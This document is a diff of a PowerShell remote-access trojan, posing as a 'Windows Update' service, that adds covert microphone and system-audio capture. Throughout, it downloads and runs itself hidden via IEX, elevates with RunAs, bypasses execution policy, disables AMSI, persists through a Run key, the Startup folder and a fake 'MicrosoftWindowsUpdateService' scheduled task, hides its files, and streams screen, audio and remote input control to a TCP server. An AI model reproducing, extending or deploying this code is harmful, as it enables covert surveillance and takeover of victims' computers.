@@ -3,22 +3,24 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# MODO VISÍVEL
-if ($args -notcontains "-silent") {
-    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    if (-not $isAdmin) {
-        try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
-        exit
-    }
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
+    exit
+}
 
-    $dir = "$env:ProgramData\Microsoft\Windows\Caches"
+$dir = "$env:ProgramData\Microsoft\Windows\Caches"
+$scriptPath = "$dir\$installName.ps1"
+$vbsPath = "$dir\$installName.vbs"
+
+if ($args -notcontains "-silent") {
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
-    try { (New-Object Net.WebClient).DownloadFile($myUrl, "$dir\$installName.ps1") } catch {}
+    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
     
-    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $dir + '\' + $installName + '.ps1"" -silent", 0, False'
-    Set-Content -Path "$dir\$installName.vbs" -Value $vbsContent -Force -ErrorAction SilentlyContinue
+    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
+    Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
     
-    $cmd = "wscript.exe //B //Nologo `"$dir\$installName.vbs`""
+    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -26,22 +28,24 @@ if ($args -notcontains "-silent") {
     } catch {}
 
     try {
-        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$dir\$installName.vbs`""
+        $startup = [Environment]::GetFolderPath('Startup')
+        Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
         $trigger1 = New-ScheduledTaskTrigger -AtLogOn
         $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
-        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)
+        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
     
-    attrib +h +s +r "$dir\$installName.ps1" 2>$null
-    attrib +h +s +r "$dir\$installName.vbs" 2>$null
+    attrib +h +s +r $scriptPath 2>$null
+    attrib +h +s +r $vbsPath 2>$null
     
-    Start-Process wscript.exe -ArgumentList "`"$dir\$installName.vbs`"" -WindowStyle Hidden
+    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
     exit
 }
-
-# MODO INVISÍVEL
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) { exit }
 
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
@@ -66,10 +70,77 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
         [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
         [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
+        
+        [DllImport("winmm.dll")] static extern int waveInOpen(out IntPtr phwi, int uDeviceID, ref WAVEFORMATEX pwfx, WaveCallback dwCallback, IntPtr dwInstance, uint fdwOpen);
+        [DllImport("winmm.dll")] static extern int waveInPrepareHeader(IntPtr hwi, IntPtr pwh, int cbwh);
+        [DllImport("winmm.dll")] static extern int waveInUnprepareHeader(IntPtr hwi, IntPtr pwh, int cbwh);
+        [DllImport("winmm.dll")] static extern int waveInAddBuffer(IntPtr hwi, IntPtr pwh, int cbwh);
+        [DllImport("winmm.dll")] static extern int waveInStart(IntPtr hwi);
+        [DllImport("winmm.dll")] static extern int waveInStop(IntPtr hwi);
+        [DllImport("winmm.dll")] static extern int waveInClose(IntPtr hwi);
+
+        [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
+        [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IMMDeviceEnumerator {
+            int NotImpl1();
+            int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
+        }
+        [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IMMDevice {
+            int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface);
+        }
+        [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IAudioClient {
+            int Initialize(int shareMode, int streamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
+            int GetBufferSize(out uint pNumBufferFrames);
+            int GetStreamLatency(out long phnsLatency);
+            int GetCurrentPadding(out uint pNumPaddingFrames);
+            int IsFormatSupported(int shareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
+            int GetMixFormat(out IntPtr ppDeviceFormat);
+            int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
+            int Start();
+            int Stop();
+            int Reset();
+            int SetEventHandle(IntPtr eventHandle);
+            int GetService(ref Guid riid, out IAudioCaptureClient ppv);
+        }
+        [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+        interface IAudioCaptureClient {
+            int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
+            int ReleaseBuffer(uint NumFramesRead);
+            int GetNextPacketSize(out uint pNumFramesInNextPacket);
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        public struct WAVEFORMATEX {
+            public ushort wFormatTag;
+            public ushort nChannels;
+            public uint nSamplesPerSec;
+            public uint nAvgBytesPerSec;
+            public ushort nBlockAlign;
+            public ushort wBitsPerSample;
+            public ushort cbSize;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct WAVEHDR {
+            public IntPtr lpData;
+            public int dwBufferLength;
+            public int dwBytesRecorded;
+            public IntPtr dwUser;
+            public int dwFlags;
+            public int dwLoops;
+            public IntPtr lpNext;
+            public IntPtr reserved;
+        }
+
+        delegate void WaveCallback(IntPtr hwi, uint uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2);
 
         static string IP;
         static int PORT;
         static bool streaming = false;
+        static bool isMicRunning = false;
+        static bool isSysRunning = false;
         static object writeLock = new object();
         static bool isLocked = false;
         static int targetX = 0, targetY = 0;
@@ -79,17 +150,27 @@ if (-not ("R9KAgent" -as [type])) {
         static Thread bannerThread = null;
         static StreamWriter globalWriter = null;
 
+        // Otimização de Memória para o Mouse não travar
         static Bitmap reuseBmp = null;
         static Graphics reuseGfx = null;
         static ImageCodecInfo jpgCodec = null;
         static EncoderParameters jpgParams = null;
+
+        static IntPtr hMic = IntPtr.Zero;
+        static IntPtr[] micHeaders = new IntPtr[2];
+        static IntPtr[] micBuffers = new IntPtr[2];
+        static WaveCallback micCallback = new WaveCallback(MicCallback);
+
+        static IAudioClient audioClient = null;
+        static IAudioCaptureClient captureClient = null;
+        static WAVEFORMATEX sysFormat = new WAVEFORMATEX();
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
             try { SetProcessDPIAware(); } catch {}
             
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
-            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
+            Thread tInput = new Thread(InputLoop); tInput.Priority = ThreadPriority.Highest; tInput.IsBackground = true; tInput.Start();
 
             while (true) {
                 TcpClient myClient = null;
@@ -174,7 +255,7 @@ if (-not ("R9KAgent" -as [type])) {
                         if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                     }
                 } catch {}
-                Thread.Sleep(1);
+                Thread.Sleep(1); // Mais rápido possível
             }
         }
 
@@ -206,11 +287,35 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
+                if (cmd == "mic_start" && !isMicRunning) {
+                    isMicRunning = true;
+                    Thread t = new Thread(StartMic); t.IsBackground = true; t.Start();
+                    return;
+                }
+                if (cmd == "mic_stop") { 
+                    isMicRunning = false; 
+                    if (hMic != IntPtr.Zero) { waveInStop(hMic); waveInClose(hMic); hMic = IntPtr.Zero; }
+                    return; 
+                }
+                
+                if (cmd == "sys_start" && !isSysRunning) {
+                    isSysRunning = true;
+                    Thread t = new Thread(StartSystemAudio); t.IsBackground = true; t.Start();
+                    return;
+                }
+                if (cmd == "sys_stop") { 
+                    isSysRunning = false; 
+                    if (audioClient != null) { audioClient.Stop(); audioClient = null; }
+                    return; 
+                }
+
                 if (cmd == "reinstall") {
                     string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                     try {
-                        var wshell = (dynamic)Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
-                        wshell.Run("powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"", 0, false);
+                        ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('" + url + "')\"");
+                        psi.WindowStyle = ProcessWindowStyle.Hidden;
+                        psi.CreateNoWindow = true;
+                        Process.Start(psi);
                     } catch {}
                     Environment.Exit(0); 
                 }
@@ -309,6 +414,96 @@ if (-not ("R9KAgent" -as [type])) {
                 else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                 else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                 else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
+            } catch {}
+        }
+
+        static void StartMic() {
+            try {
+                WAVEFORMATEX wfx = new WAVEFORMATEX();
+                wfx.wFormatTag = 1; // PCM
+                wfx.nChannels = 2;
+                wfx.nSamplesPerSec = 44100;
+                wfx.wBitsPerSample = 16;
+                wfx.nBlockAlign = (ushort)(wfx.nChannels * wfx.wBitsPerSample / 8);
+                wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
+                wfx.cbSize = 0;
+
+                if (waveInOpen(out hMic, 0, ref wfx, micCallback, IntPtr.Zero, 0x00030000) != 0) return; 
+                
+                for (int i = 0; i < 2; i++) {
+                    micHeaders[i] = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WAVEHDR)));
+                    micBuffers[i] = Marshal.AllocHGlobal(17640); // 100ms
+
+                    WAVEHDR hdr = new WAVEHDR();
+                    hdr.lpData = micBuffers[i];
+                    hdr.dwBufferLength = 17640;
+                    Marshal.StructureToPtr(hdr, micHeaders[i], false);
+
+                    waveInPrepareHeader(hMic, micHeaders[i], Marshal.SizeOf(typeof(WAVEHDR)));
+                    waveInAddBuffer(hMic, micHeaders[i], Marshal.SizeOf(typeof(WAVEHDR)));
+                }
+                waveInStart(hMic);
+            } catch {}
+        }
+
+        static void MicCallback(IntPtr hwi, uint uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2) {
+            if (uMsg == 0x3C0) { // WIM_DATA
+                if (globalWriter != null && isMicRunning) {
+                    try {
+                        WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(dwParam1, typeof(WAVEHDR));
+                        byte[] buf = new byte[hdr.dwBufferLength];
+                        Marshal.Copy(hdr.lpData, buf, 0, hdr.dwBufferLength);
+                        lock (writeLock) { globalWriter.WriteLine("MIC:" + Convert.ToBase64String(buf)); }
+                    } catch {}
+                }
+                if (isMicRunning) waveInAddBuffer(hwi, dwParam1, Marshal.SizeOf(typeof(WAVEHDR)));
+            }
+        }
+
+        static void StartSystemAudio() {
+            try {
+                IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
+                IMMDevice device;
+                enumerator.GetDefaultAudioEndpoint(0, 1, out device); 
+                
+                Guid IID_IAudioClient = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
+                device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient); 
+                
+                IntPtr pFormat;
+                audioClient.GetMixFormat(out pFormat);
+                sysFormat = (WAVEFORMATEX)Marshal.PtrToStructure(pFormat, typeof(WAVEFORMATEX));
+                
+                audioClient.Initialize(0, 0x00080000, 10000000, 10000000, pFormat, IntPtr.Zero); 
+                
+                Guid IID_IAudioCaptureClient = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");
+                audioClient.GetService(ref IID_IAudioCaptureClient, out captureClient);
+                
+                audioClient.Start();
+                
+                while (isSysRunning && globalWriter != null) {
+                    Thread.Sleep(50);
+                    uint packetSize;
+                    captureClient.GetNextPacketSize(out packetSize);
+                    while (packetSize > 0 && isSysRunning) {
+                        IntPtr pData;
+                        uint numFrames;
+                        uint flags;
+                        ulong pos, qpc;
+                        captureClient.GetBuffer(out pData, out numFrames, out flags, out pos, out qpc);
+                        
+                        if (numFrames > 0) {
+                            int bytes = (int)(numFrames * sysFormat.nBlockAlign);
+                            byte[] buffer = new byte[bytes];
+                            Marshal.Copy(pData, buffer, 0, bytes);
+                            lock (writeLock) {
+                                if (globalWriter != null) globalWriter.WriteLine("SYS:" + Convert.ToBase64String(buffer));
+                            }
+                        }
+                        captureClient.ReleaseBuffer(numFrames);
+                        captureClient.GetNextPacketSize(out packetSize);
+                    }
+                }
+                audioClient.Stop();
             } catch {}
         }
 
